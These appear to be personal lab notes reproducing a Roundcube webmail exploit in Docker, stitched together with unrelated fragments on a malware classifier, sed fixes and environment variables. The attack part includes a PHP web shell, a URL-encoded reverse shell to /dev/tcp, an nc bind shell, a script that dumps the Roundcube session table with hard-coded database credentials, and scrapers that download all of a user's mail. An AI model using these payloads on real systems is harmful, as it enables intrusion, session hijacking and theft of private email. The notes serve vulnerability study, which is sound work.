
### session extractor
```python
import socket

import time

  

HOST = "127.0.0.1"

PORT = 4444

SESSION_FILE = "sessions_bind_shell.txt"

  

def recv_all(sock, wait=0.5, timeout=4):

    sock.settimeout(wait)

    data = b""

    start = time.time()

    try:

        while time.time() - start < timeout:

            try:

                chunk = sock.recv(4096)

                if not chunk:

                    break

                data += chunk

            except socket.timeout:

                break

    except Exception as e:

        print(f"[!] Error receiving data: {e}")

    return data.decode(errors="ignore")

  

def main():

    print(f"[+] Connecting to bind shell at {HOST}:{PORT}...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))

    print("[✓] Connected.")

  

    time.sleep(1)

  

    # Non-interactive MySQL command

    cmd = "mysql -u roundcube -pfearsoff.org -e \"SELECT * FROM session;\" roundcube\n"

    print("[•] Sending non-interactive MySQL command...")

    s.sendall(cmd.encode())

  

    time.sleep(4)  # wait for response

    output = recv_all(s, timeout=5)

  

    print("[✓] Received response:")

    #print(output)

  

    with open(SESSION_FILE, "w", encoding="utf-8") as f:

        f.write(output)

  

    print(f"[✓] Session data written to {SESSION_FILE}")

    s.close()

  

if __name__ == "__main__":

    main()
```

### create user
```bash
#!/bin/bash

PASSWORD='zaki'
MAILDIR='/var/mail'

for i in $(seq 1 100); do
    USER="user$i"

    useradd -m "$USER"

    # Set password non-interactively
    echo "$USER:$PASSWORD" | chpasswd

    # Create mailbox file if it doesn't exist
    touch "$MAILDIR/$USER"
    chown "$USER:mail" "$MAILDIR/$USER"

    echo "[+] Created $USER with password $PASSWORD"
done

```


### run image
```
```powershell
docker run --name ubuntu24 `
>>   -p 9876:80 `
>>   -p 9877:443 `
>>   -p 4444:4444 `
>>   -v "${fullPath}:/root/rc_install.sh:ro" `
>>   -it ubuntu:24.04 `
>>   bash -c "apt update && apt install -y dos2unix && cp /root/rc_install.sh /tmp/install.sh && dos2unix /tmp/install.sh && chmod +x /tmp/install.sh && /tmp/install.sh && exec bash"
```

nc.traditional -nlvp 4444 -e /bin/bash
mysql -u roundcube -pfearsoff.org -e "SELECT * FROM session;" roundcube
adduser testuser
id testuser
echo "Test email to testuser" | mutt -s "Hello Testuser" testuser@localhost
echo "Here is an image" | mutt -s "Image from Mutt" -a /root/home.png -- testuser@localhost
su testuser
docker run -it -p 9876:80 -p 4444:4444 --name ubuntu24_new ubuntu24_modified bash
TRUNCATE TABLE session;

![[Pasted image 20250731150434.png]]


![[Pasted image 20250730142613.png]]



![[Pasted image 20250730145239.png]]
![[Pasted image 20250730145342.png]]
![[Pasted image 20250730145451.png]]

![[Pasted image 20250731144055.png]]
![[Pasted image 20250731144122.png]]







![[Pasted image 20250728103121.png]]
![[Pasted image 20250728103206.png]]




![[Pasted image 20250728095113.png]]
![[Pasted image 20250728095553.png]]

### reverse shell in kali

```r
http://192.168.1.2:9876/index.php?cmd=bash+-c+%27exec+bash+-i+%3E%26/dev/tcp/192.168.29.133/4444+0%3E%261%27
```

mysql -u roundcube -p -h localhost roundcube
### web_shell
```php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    exit;
}
```

### forbidden and accessible files:

All files inside the Roundcube container are initially forbidden, except for those under the `public_html` directory, which are accessible. However, if I create or modify a file in most of the restricted folders, it then becomes accessible. There are only four specific folders where even newly created or modified files remain inaccessible and still return a "forbidden" error which are ("SQL, bin, config, vendor").
![[Pasted image 20250723110203.png]]

### scraping roundcube

```python
import requests

from bs4 import BeautifulSoup

import os

import sys

import re

from urllib.parse import quote

import json

from email.parser import BytesParser

from email.utils import parsedate_to_datetime

from datetime import datetime, timedelta

  

def login_to_roundcube(session, base_url, username, password):

    print("[+] Getting login page to retrieve CSRF token...")

    r = session.get(f"{base_url}/?_task=login")

    soup = BeautifulSoup(r.text, "html.parser")

  

    token_input = soup.find("input", {"name": "_token"})

    if not token_input:

        raise Exception("[-] CSRF token input not found on login page.")

    csrf_token = token_input.get("value", "")

    print(f"[+] CSRF token found: {csrf_token}")

  

    payload = {

        "_user": username,

        "_pass": password,

        "_action": "login",

        "_task": "login",

        "_token": csrf_token

    }

  

    print("[+] Logging in...")

    response = session.post(f"{base_url}/?_task=login", data=payload)

  

    if "logout" not in response.text.lower():

        raise Exception("[-] Login failed. Check credentials or CSRF token.")

    print("[+] Login successful.")

    return response

  

def is_email_recent(session, base_url, folder, uid, days=15):

    url = f"{base_url}/?_task=mail&_action=viewsource&_mbox={quote(folder)}&_uid={uid}"

    r = session.get(url)

    if r.status_code != 200 or not r.content.strip():

        print(f"[-] Failed to fetch email headers for UID {uid} in folder '{folder}'")

        return False

    # Parse headers using email.parser

    try:

        headers = BytesParser().parsebytes(r.content, headersonly=True)

        date_str = headers.get("Date")

        if not date_str:

            print(f"[-] No Date header in UID {uid}, skipping.")

            return False

        email_date = parsedate_to_datetime(date_str)

        threshold_date = datetime.now(email_date.tzinfo) - timedelta(days=days)

        if email_date >= threshold_date:

            return True

        else:

            print(f"[✘] Skipping UID {uid}, too old (Date: {email_date})")

            return False

  

    except Exception as e:

        print(f"[-] Failed to parse Date header for UID {uid}: {e}")

        return False

  

def extract_folders_from_mail_env(response_text):

    # Extract the JS object passed to rcmail.set_env(...)

    match = re.search(r"rcmail\.set_env\((\{.*?\})\);", response_text, re.DOTALL)

    if not match:

        print("[-] Failed to find rcmail.set_env block.")

        return []

  

    env_js_obj = match.group(1)

  

    # Convert JavaScript-style object to proper JSON

    env_js_obj = re.sub(r"([{,])\s*([a-zA-Z0-9_]+)\s*:", r'\1 "\2":', env_js_obj)  # quote keys

    env_js_obj = env_js_obj.replace("'", '"')  # single quotes to double

    env_js_obj = env_js_obj.replace("true", "true").replace("false", "false")  # JS to JSON booleans

  

    try:

        env_dict = json.loads(env_js_obj)

        mailboxes = env_dict.get("mailboxes_list") or list(env_dict.get("mailboxes", {}).keys())

        print(f"[+] Found folders: {mailboxes}")

        return mailboxes

    except Exception as e:

        print("[-] Failed to parse rcmail.set_env JSON:", e)

        return []

  
  

def fetch_mail_folders(session, base_url):

    print("[+] Fetching mail page and extracting folders from JavaScript...")

  

    r = session.get(f"{base_url}/?_task=mail")

    if "Roundcube Webmail Login" in r.text:

        print("[-] Still on login page — something went wrong.")

        return []

  

    return extract_folders_from_mail_env(r.text)

  

def list_emails_in_folder(session, base_url, folder):

    print(f"=== Processing folder: {folder} ===")

  

    # Get CSRF token for folder page

    inbox_url = f"{base_url}/?_task=mail&_mbox={quote(folder)}"

    r = session.get(inbox_url)

    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find("input", {"name": "_token"})

    if not token_input:

        print(f"[-] No CSRF token found for folder {folder}, skipping.")

        return []

    csrf_token = token_input.get("value", "")

  

    ajax_url = f"{base_url}/?_task=mail&_action=list"

    headers = {

        "X-Requested-With": "XMLHttpRequest",

        "Referer": inbox_url,

        "Content-Type": "application/x-www-form-urlencoded",

        "User-Agent": "Mozilla/5.0"

    }

    payload = {

        "_mbox": folder,

        "_page": "1",

        "_refresh": "1",

        "_remote": "1",

        "_unlock": "load123",

        "_token": csrf_token

    }

    response = session.post(ajax_url, headers=headers, data=payload)

  

    # Extract UIDs from add_message_row calls

    uids = re.findall(r'add_message_row\((\d+),', response.text)

    print(f"[+] Folder '{folder}' has {len(uids)} emails.")

    return uids

  

def save_email(session, base_url, folder, uid, output_dir):

    print(f"[+] Fetching UID {uid} from folder '{folder}'")

    url = f"{base_url}/?_task=mail&_action=viewsource&_mbox={quote(folder)}&_uid={uid}"

    r = session.get(url)

  

    if r.status_code != 200 or not r.content.strip():

        print(f"[-] Failed to download UID {uid} from '{folder}'")

        return

  

    os.makedirs(output_dir, exist_ok=True)

    eml_path = os.path.join(output_dir, f"{uid}.eml")

    with open(eml_path, "wb") as f:

        f.write(r.content)

    print(f"[✔] Saved email to: {eml_path}")

  

def main():

    if len(sys.argv) < 3:

        print(f"Usage: {sys.argv[0]} <username> <password>")

        sys.exit(1)

  

    username = sys.argv[1]

    password = sys.argv[2]

    base_url = "http://127.0.0.1"  # Adjust this to your Roundcube URL

  

    output_base = f"./http_backup_{username}"

    os.makedirs(output_base, exist_ok=True)

  

    session = requests.Session()

  

    try:

        login_to_roundcube(session, base_url, username, password)

        folders = fetch_mail_folders(session, base_url)

  

        for folder in folders:

            uids = list_emails_in_folder(session, base_url, folder)

            folder_dir = os.path.join(output_base, folder)

  

            # ✅ Always create the folder

            os.makedirs(folder_dir, exist_ok=True)

  

            if not uids:

                print(f"[+] Folder '{folder}' is empty. Created folder anyway.")

            else:

                for uid in uids:

                    if is_email_recent(session, base_url, folder, uid, days=15):

                        save_email(session, base_url, folder, uid, folder_dir)

  

        print(f"\n[✓] Backup complete. Emails saved under {output_base}/<folder_name>/*.eml")

  

    except Exception as e:

        print("[-] Error:", e)

  

if __name__ == "__main__":

    main()
```







![[Pasted image 20250711114109.png]]

![[Pasted image 20250711114113.png]]
![[Pasted image 20250711114116.png]]
![[Pasted image 20250711114119.png]]

### Logic

```d
connect to IMAP using imaplib
login with username and password
list folders
for each folder:
    select the folder
    search all messages
    for each message ID:
        fetch the email
        save it as .eml

```
### roundcube scraping


```python
import requests
from bs4 import BeautifulSoup
import os
import sys
import re
from urllib.parse import quote
import json
from email.parser import BytesParser
from email.utils import parsedate_to_datetime
from datetime import datetime, timedelta

def login_to_roundcube(session, base_url, username, password):
    print("[+] Getting login page to retrieve CSRF token...")
    r = session.get(f"{base_url}/?_task=login")
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        raise Exception("[-] CSRF token input not found on login page.")
    csrf_token = token_input.get("value", "")
    print(f"[+] CSRF token found: {csrf_token}")

    payload = {
        "_user": username,
        "_pass": password,
        "_action": "login",
        "_task": "login",
        "_token": csrf_token
    }

    print("[+] Logging in...")
    response = session.post(f"{base_url}/?_task=login", data=payload)

    if "logout" not in response.text.lower():
        raise Exception("[-] Login failed. Check credentials or CSRF token.")
    print("[+] Login successful.")
    return response

def is_email_recent(session, base_url, folder, uid, days=15):
    url = f"{base_url}/?_task=mail&_action=viewsource&_mbox={quote(folder)}&_uid={uid}"
    r = session.get(url)
    
    if r.status_code != 200 or not r.content.strip():
        print(f"[-] Failed to fetch email headers for UID {uid} in folder '{folder}'")
        return False
    
    # Parse headers using email.parser
    try:
        headers = BytesParser().parsebytes(r.content, headersonly=True)
        date_str = headers.get("Date")
        if not date_str:
            print(f"[-] No Date header in UID {uid}, skipping.")
            return False
        
        email_date = parsedate_to_datetime(date_str)
        threshold_date = datetime.now(email_date.tzinfo) - timedelta(days=days)
        
        if email_date >= threshold_date:
            return True
        else:
            print(f"[✘] Skipping UID {uid}, too old (Date: {email_date})")
            return False

    except Exception as e:
        print(f"[-] Failed to parse Date header for UID {uid}: {e}")
        return False

def extract_folders_from_mail_env(response_text):
    # Extract the JS object passed to rcmail.set_env(...)
    match = re.search(r"rcmail\.set_env\((\{.*?\})\);", response_text, re.DOTALL)
    if not match:
        print("[-] Failed to find rcmail.set_env block.")
        return []

    env_js_obj = match.group(1)

    # Convert JavaScript-style object to proper JSON
    env_js_obj = re.sub(r"([{,])\s*([a-zA-Z0-9_]+)\s*:", r'\1 "\2":', env_js_obj)  # quote keys
    env_js_obj = env_js_obj.replace("'", '"')  # single quotes to double
    env_js_obj = env_js_obj.replace("true", "true").replace("false", "false")  # JS to JSON booleans

    try:
        env_dict = json.loads(env_js_obj)
        mailboxes = env_dict.get("mailboxes_list") or list(env_dict.get("mailboxes", {}).keys())
        print(f"[+] Found folders: {mailboxes}")
        return mailboxes
    except Exception as e:
        print("[-] Failed to parse rcmail.set_env JSON:", e)
        return []


def fetch_mail_folders(session, base_url):
    print("[+] Fetching mail page and extracting folders from JavaScript...")

    r = session.get(f"{base_url}/?_task=mail")
    if "Roundcube Webmail Login" in r.text:
        print("[-] Still on login page — something went wrong.")
        return []

    return extract_folders_from_mail_env(r.text)

def list_emails_in_folder(session, base_url, folder):
    print(f"=== Processing folder: {folder} ===")

    # Get CSRF token for folder page
    inbox_url = f"{base_url}/?_task=mail&_mbox={quote(folder)}"
    r = session.get(inbox_url)
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        print(f"[-] No CSRF token found for folder {folder}, skipping.")
        return []
    csrf_token = token_input.get("value", "")

    ajax_url = f"{base_url}/?_task=mail&_action=list"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": inbox_url,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    payload = {
        "_mbox": folder,
        "_page": "1",
        "_refresh": "1",
        "_remote": "1",
        "_unlock": "load123",
        "_token": csrf_token
    }
    response = session.post(ajax_url, headers=headers, data=payload)

    # Extract UIDs from add_message_row calls
    uids = re.findall(r'add_message_row\((\d+),', response.text)
    print(f"[+] Folder '{folder}' has {len(uids)} emails.")
    return uids

def save_email(session, base_url, folder, uid, output_dir):
    print(f"[+] Fetching UID {uid} from folder '{folder}'")
    url = f"{base_url}/?_task=mail&_action=viewsource&_mbox={quote(folder)}&_uid={uid}"
    r = session.get(url)

    if r.status_code != 200 or not r.content.strip():
        print(f"[-] Failed to download UID {uid} from '{folder}'")
        return

    os.makedirs(output_dir, exist_ok=True)
    eml_path = os.path.join(output_dir, f"{uid}.eml")
    with open(eml_path, "wb") as f:
        f.write(r.content)
    print(f"[✔] Saved email to: {eml_path}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <password>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    base_url = "http://127.0.0.1"  # Adjust this to your Roundcube URL

    output_base = f"./http_backup_{username}"
    os.makedirs(output_base, exist_ok=True)

    session = requests.Session()

    try:
        login_to_roundcube(session, base_url, username, password)
        folders = fetch_mail_folders(session, base_url)

        for folder in folders:
            uids = list_emails_in_folder(session, base_url, folder)
            folder_dir = os.path.join(output_base, folder)

            # ✅ Always create the folder
            os.makedirs(folder_dir, exist_ok=True)

            if not uids:
                print(f"[+] Folder '{folder}' is empty. Created folder anyway.")
            else:
                for uid in uids:
                    save_email(session, base_url, folder, uid, folder_dir)

        print(f"\n[✓] Backup complete. Emails saved under {output_base}/<folder_name>/*.eml")

    except Exception as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    main()
```









```python
import requests
from bs4 import BeautifulSoup
import os
import sys
import re
from urllib.parse import quote
import json
def login_to_roundcube(session, base_url, username, password):
    print("[+] Getting login page to retrieve CSRF token...")
    r = session.get(f"{base_url}/?_task=login")
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        raise Exception("[-] CSRF token input not found on login page.")
    csrf_token = token_input.get("value", "")
    print(f"[+] CSRF token found: {csrf_token}")

    payload = {
        "_user": username,
        "_pass": password,
        "_action": "login",
        "_task": "login",
        "_token": csrf_token
    }

    print("[+] Logging in...")
    response = session.post(f"{base_url}/?_task=login", data=payload)

    if "logout" not in response.text.lower():
        raise Exception("[-] Login failed. Check credentials or CSRF token.")
    print("[+] Login successful.")
    return response
def extract_folders_from_mail_env(response_text):
    # Extract the JS object passed to rcmail.set_env(...)
    match = re.search(r"rcmail\.set_env\((\{.*?\})\);", response_text, re.DOTALL)
    if not match:
        print("[-] Failed to find rcmail.set_env block.")
        return []

    env_js_obj = match.group(1)

    # Convert JavaScript-style object to proper JSON
    env_js_obj = re.sub(r"([{,])\s*([a-zA-Z0-9_]+)\s*:", r'\1 "\2":', env_js_obj)  # quote keys
    env_js_obj = env_js_obj.replace("'", '"')  # single quotes to double
    env_js_obj = env_js_obj.replace("true", "true").replace("false", "false")  # JS to JSON booleans

    try:
        env_dict = json.loads(env_js_obj)
        mailboxes = env_dict.get("mailboxes_list") or list(env_dict.get("mailboxes", {}).keys())
        print(f"[+] Found folders: {mailboxes}")
        return mailboxes
    except Exception as e:
        print("[-] Failed to parse rcmail.set_env JSON:", e)
        return []


def fetch_mail_folders(session, base_url):
    print("[+] Fetching mail page and extracting folders from JavaScript...")

    r = session.get(f"{base_url}/?_task=mail")
    if "Roundcube Webmail Login" in r.text:
        print("[-] Still on login page — something went wrong.")
        return []

    return extract_folders_from_mail_env(r.text)

def list_emails_in_folder(session, base_url, folder):
    print(f"=== Processing folder: {folder} ===")

    # Get CSRF token for folder page
    inbox_url = f"{base_url}/?_task=mail&_mbox={quote(folder)}"
    r = session.get(inbox_url)
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        print(f"[-] No CSRF token found for folder {folder}, skipping.")
        return []
    csrf_token = token_input.get("value", "")

    ajax_url = f"{base_url}/?_task=mail&_action=list"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": inbox_url,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    payload = {
        "_mbox": folder,
        "_page": "1",
        "_refresh": "1",
        "_remote": "1",
        "_unlock": "load123",
        "_token": csrf_token
    }
    response = session.post(ajax_url, headers=headers, data=payload)

    # Extract UIDs from add_message_row calls
    uids = re.findall(r'add_message_row\((\d+),', response.text)
    print(f"[+] Folder '{folder}' has {len(uids)} emails.")
    return uids

def save_email(session, base_url, folder, uid, output_dir):
    print(f"[+] Fetching UID {uid} from folder '{folder}'")
    url = f"{base_url}/?_task=mail&_action=viewsource&_mbox={quote(folder)}&_uid={uid}"
    r = session.get(url)

    if r.status_code != 200 or not r.content.strip():
        print(f"[-] Failed to download UID {uid} from '{folder}'")
        return

    os.makedirs(output_dir, exist_ok=True)
    eml_path = os.path.join(output_dir, f"{uid}.eml")
    with open(eml_path, "wb") as f:
        f.write(r.content)
    print(f"[✔] Saved email to: {eml_path}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <password>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    base_url = "http://127.0.0.1"  # Adjust this to your Roundcube URL

    output_base = f"./http_backup_{username}"
    os.makedirs(output_base, exist_ok=True)

    session = requests.Session()

    try:
        login_to_roundcube(session, base_url, username, password)
        folders = fetch_mail_folders(session, base_url)

        for folder in folders:
            uids = list_emails_in_folder(session, base_url, folder)
            folder_dir = os.path.join(output_base, folder)
            for uid in uids:
                save_email(session, base_url, folder, uid, folder_dir)

        print(f"\n[✓] Backup complete. Emails saved under {output_base}/<folder_name>/*.eml")

    except Exception as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    main()
```



```python 
import requests
from bs4 import BeautifulSoup
import os
import sys
import re
import json

def login_to_roundcube(session, base_url, username, password):
    login_page_url = f"{base_url}/?_task=login"
    print("[+] Getting login page to retrieve CSRF token...")
    r = session.get(login_page_url)
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        raise Exception("[-] CSRF token input not found on login page.")
    csrf_token = token_input.get("value", "")
    print(f"[+] CSRF token found: {csrf_token}")

    payload = {
        "_user": username,
        "_pass": password,
        "_action": "login",
        "_task": "login",
        "_token": csrf_token
    }

    print("[+] Logging in...")
    response = session.post(login_page_url, data=payload)

    if "logout" not in response.text.lower():
        raise Exception("[-] Login failed. Check credentials or CSRF token.")
    print("[+] Login successful.")
    return response

def js_to_json(js_obj_str):
    """
    Converts a JS-like object to JSON:
    - Quotes keys
    - Converts single quotes to double
    - Escapes problematic HTML characters
    """
    # Step 1: remove newlines and extra spaces
    js_obj_str = js_obj_str.replace("\n", "").replace("\r", "").strip()

    # Step 2: Quote unquoted keys: {subject: → {"subject":
    js_obj_str = re.sub(r'([{,])\s*([a-zA-Z0-9_]+)\s*:', r'\1 "\2":', js_obj_str)

    # Step 3: Convert single quotes to double quotes
    js_obj_str = re.sub(r"'", '"', js_obj_str)

    return js_obj_str

def list_emails(session, base_url):
    inbox_url = f"{base_url}/?_task=mail&_mbox=INBOX"
    inbox_page = session.get(inbox_url)
    soup = BeautifulSoup(inbox_page.text, "html.parser")

    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        raise Exception("[-] Could not find CSRF token on mail page.")
    csrf_token = token_input.get("value", "")
    print(f"[+] Found mail CSRF token: {csrf_token}")

    ajax_url = f"{base_url}/?_task=mail&_action=list"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": inbox_url,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }

    payload = {
        "_mbox": "INBOX",
        "_page": "1",
        "_refresh": "1",
        "_remote": "1",
        "_unlock": "load123",
        "_token": csrf_token
    }

    response = session.post(ajax_url, headers=headers, data=payload)
    content = response.text

    # Match UID and first JSON-like object only
    message_rows = re.findall(
        r'add_message_row\((\d+),\s*({.*?})\s*,', content
    )

    messages = []

    for uid, js_obj in message_rows:
        try:
            print(f"\n[>] UID: {uid}")
            print("[>] Raw JS object before fixing:")
            print(js_obj)

            # This is already double-quoted — just unescape HTML
            json_str = bytes(js_obj, "utf-8").decode("unicode_escape")
            metadata = json.loads(json_str)

            full_url = f"{base_url}/?_task=mail&_action=show&_mbox=INBOX&_uid={uid}"
            print(f"[+] Parsed subject: {metadata.get('subject')}")
            messages.append((uid, full_url))
        except Exception as e:
            print(f"[-] Failed to parse message UID {uid}: {e}")

    print(f"[+] Found {len(messages)} emails.")
    return messages


def save_email_as_eml(session, base_url, uid, base_dir):
    print(f"[+] Fetching raw email UID: {uid}")
    viewsource_url = f"{base_url}/?_task=mail&_action=viewsource&_mbox=INBOX&_uid={uid}"

    response = session.get(viewsource_url)
    if response.status_code != 200:
        print(f"[-] Failed to get raw source for UID {uid}")
        return

    eml_path = os.path.join(base_dir, f"{uid}.eml")
    with open(eml_path, "w", encoding="utf-8") as f:
        f.write(response.text)
    print(f"[✔] Saved email as .eml: {eml_path}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <password>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    base_url = "http://127.0.0.1"

    output_dir = f"./http_backup_{username}"
    os.makedirs(output_dir, exist_ok=True)

    session = requests.Session()

    try:
        login_to_roundcube(session, base_url, username, password)
        messages = list_emails(session, base_url)

        for uid, msg_url in messages:
            save_email_as_eml(session, base_url, uid, output_dir)

        print(f"\n[✓] Backup completed! All emails saved to: {output_dir}")
    except Exception as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    main()
```

```python
import imaplib
import email
import os
import sys

def connect_imap(username, password, imap_host='localhost', imap_port=143):
    print(f"[+] Connecting to {imap_host}:{imap_port} as {username}")
    mail = imaplib.IMAP4(imap_host, imap_port)
    mail.login(username, password)
    return mail

def list_folders(mail):
    print("[+] Listing folders:")
    status, folders = mail.list()
    if status != "OK":
        raise Exception("Could not list folders")

    folder_names = []
    for folder in folders:
        parts = folder.decode().split(' "/" ')
        if len(parts) == 2:
            folder_names.append(parts[1].strip('"'))
            print("  -", parts[1].strip('"'))
    return folder_names

def fetch_and_save_emails(mail, folder_name, base_dir):
    print(f"[+] Processing folder: {folder_name}")
    safe_folder = folder_name.replace("/", "_")
    folder_path = os.path.join(base_dir, safe_folder)
    os.makedirs(folder_path, exist_ok=True)

    mail.select(f'"{folder_name}"', readonly=True)
    result, data = mail.search(None, "ALL")
    if result != "OK":
        print(f"  [-] Failed to search in folder: {folder_name}")
        return
    print(f"data: {data}")
    email_ids = data[0].split()
    print(f"  [+] Found {len(email_ids)} messages")

    for num in email_ids:
        result, msg_data = mail.fetch(num, "(RFC822)")
        if result != "OK":
            print(f"  [-] Failed to fetch message {num}")
            continue

        raw_email = msg_data[0][1]
        filename = os.path.join(folder_path, f"{num.decode()}.eml")
        with open(filename, "wb") as f:
            f.write(raw_email)
        print(f"    [✔] Saved: {filename}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <password>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]

    output_dir = f"./backup_{username}"
    os.makedirs(output_dir, exist_ok=True)

    try:
        mail = connect_imap(username, password)
        folders = list_folders(mail)

        for folder in folders:
            fetch_and_save_emails(mail, folder, output_dir)

        mail.logout()
        print(f"\n[✓] Backup completed! All emails saved to: {output_dir}")

    except Exception as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    main()

```




### install roundcube

```powershell


$fullPath = "C:\Users\PC\Documents\CVE-2025-49113\rc_install.sh"


docker run --rm --name ubuntu24 `
  -p 9876:80 `
  -v "${fullPath}:/root/rc_install.sh:ro" `
  -it ubuntu:24.04 `
  bash -c "apt update && apt install -y dos2unix && cp /root/rc_install.sh /tmp/install.sh && dos2unix /tmp/install.sh && chmod +x /tmp/install.sh && /tmp/install.sh && exec bash"



docker run --name ubuntu24 `
  -p 9876:80 `
  -v "${fullPath}:/root/rc_install.sh:ro" `
  -it ubuntu:24.04 `
  bash -c "apt update && apt install -y dos2unix && cp /root/rc_install.sh /tmp/install.sh && dos2unix /tmp/install.sh && chmod +x /tmp/install.sh && /tmp/install.sh && exec bash"

```



```bash
docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e discovery.type=single-node -e xpack.security.enabled=false -e ES_JAVA_OPTS="-Xms512m -Xmx512m" [docker.elastic.co/elasticsearch/elasticsearch:8.17.3](https://docker.elastic.co/elasticsearch/elasticsearch:8.17.3)
```


```powershell
docker cp .\home.png roundcube-mail:/root/home.png
echo "This is a test from inside container" | mail -s "Hello from Postfix" roundcube

docker cp .\home.png roundcube-mail:/root/home.png

echo "Here is an image" | mutt -s "Image from Mutt" -a /root/home.png -- roundcube@localhost
```

![[Pasted image 20250708161049.png]]

![[Pasted image 20250708162725.png]]





```python
import mailbox
import email
import os

mailbox_path = "/var/mail/roundcube"

attachments_dir = "./attachments"
os.makedirs(attachments_dir, exist_ok=True)

mbox = mailbox.mbox(mailbox_path)

# Process each email
for i, message in enumerate(mbox, 1):
    print(f"--- Email {i} ---")
    print("From:", message.get("From"))
    print("Subject:", message.get("Subject"))
    print("Date:", message.get("Date"))

    # Convert to email.message.Message for parsing MIME
    if not isinstance(message, email.message.Message):
        message = email.message_from_string(str(message))

    # Handle email parts
    if message.is_multipart():
        for part in message.walk():
            content_type = part.get_content_type()
            content_disposition = part.get("Content-Disposition", "")

            # Extract plain text body
            if content_type == "text/plain" and "attachment" not in content_disposition:
                body = part.get_payload(decode=True).decode(errors="ignore")
                print("Body:\n", body)

            # Handle attachments
            if "attachment" in content_disposition:
                filename = part.get_filename()
                if filename:
                    filepath = os.path.join(attachments_dir, filename)
                    with open(filepath, "wb") as f:
                        f.write(part.get_payload(decode=True))
                    print(f"Attachment saved: {filepath}")
    else:
        # Non-multipart: simple text email
        body = message.get_payload(decode=True).decode(errors="ignore")
        print("Body:\n", body)

    print("-" * 40)

```


![[Pasted image 20250709092919.png]]













sed -i 's/print \([^ ]\)/print(\1)/g' dvm.py
sed -i 's/xrange(/range(/g' dvm.py




sequenceDiagram

    actor User

    participant Auth

    participant System

    participant VirusTotal

    participant Database

    participant MLModel

  

    User->>Auth: Authentication Request

    Auth-->>User: Authentication Response

    User->>System: Submit APK/Hash

    alt is APK Hash

        System->>VirusTotal: Query Hash

    else is APK File

        System->>VirusTotal: Submit APK

    end

    VirusTotal-->>System: Analysis Results (JSON)

    System->>Database: Store VirusTotal Results

    System->>System: Extract APK Features

    System->>MLModel: Process Features

    MLModel-->>System: Classification Result

    System->>Database: Store ML Results

    System-->>User: Display Results (Malware/Goodware)

    System-->>User: Show APK Details
     

![[Pasted image 20250313111605.png]]
get_regex_strings("TESTSTRING")




`windows`
*Get-ChildItem -Path . -Recurse -Filter "*.html" | ForEach-Object {
    (Get-Content $_.FullName) -replace 'zekuelbouzrazi@gmail.com', '' | Set-Content $_.FullName
}
`linux`
find . -type f -name "*.html" -exec sed -i '' 's/zekuelbouzrazi@gmail.com//g' {} +




### Environment Variable

An **environment variable** is a dynamic value that can affect the way running processes behave on a computer. These variables are part of the environment in which a process runs and can be used to pass configuration information to applications and system processes. Environment variables are used across different operating systems, including Windows, Linux, and macOS.

#### Key Characteristics:
- **Name-Value Pair:** Environment variables are typically represented as key-value pairs. For example, `PATH=/usr/bin:/bin:/usr/sbin:/sbin`.
- **Scope:** They can have different scopes:
  - **System-level:** Available to all users and processes on the system.
  - **User-level:** Available only to the specific user who set them.
  - **Session-level:** Available only within the specific session or terminal where they were defined.

#### Common Uses:
- **Configuration Settings:** Environment variables can store settings such as paths to executable files (`PATH`), home directories (`HOME` on Unix-like systems), and configuration options.
- **Sensitive Information:** They are often used to store sensitive information such as API keys, passwords, and tokens.
- **Customization:** Users and applications can customize behavior without changing code.

#### Examples:
- **Unix/Linux:**
  ```sh
  export PATH="/usr/local/bin:/usr/bin:/bin"
  export HOME="/home/username"
  ```
- **Windows:**
  ```cmd
  set PATH=C:\Windows\System32;C:\Windows
  set USERNAME=yourusername
  ```

#### How to Access:
- **Unix/Linux:** You can access environment variables using commands like `echo $VARIABLE_NAME` or within scripts using `$VARIABLE_NAME`.
- **Windows:** Access them using `%VARIABLE_NAME%` in the Command Prompt or PowerShell.

#### Setting Environment Variables:
- **Unix/Linux:** Use the `export` command in shell scripts or `.bashrc`, `.profile` files.
- **Windows:** Use the `set` command in Command Prompt, or define them in System Properties > Environment Variables.

### Example Usage in Code:
- **Python:**
  ```python
  import os
  path = os.getenv('PATH')
  print(f'The current PATH is: {path}')
  ```
- **JavaScript (Node.js):**
  ```javascript
  const path = process.env.PATH;
  console.log(`The current PATH is: ${path}`);
  ```

Environment variables are a powerful way to manage configuration and sensitive information in a flexible and secure manner, making them integral to both development and production environments.



-------------
### Home Directories

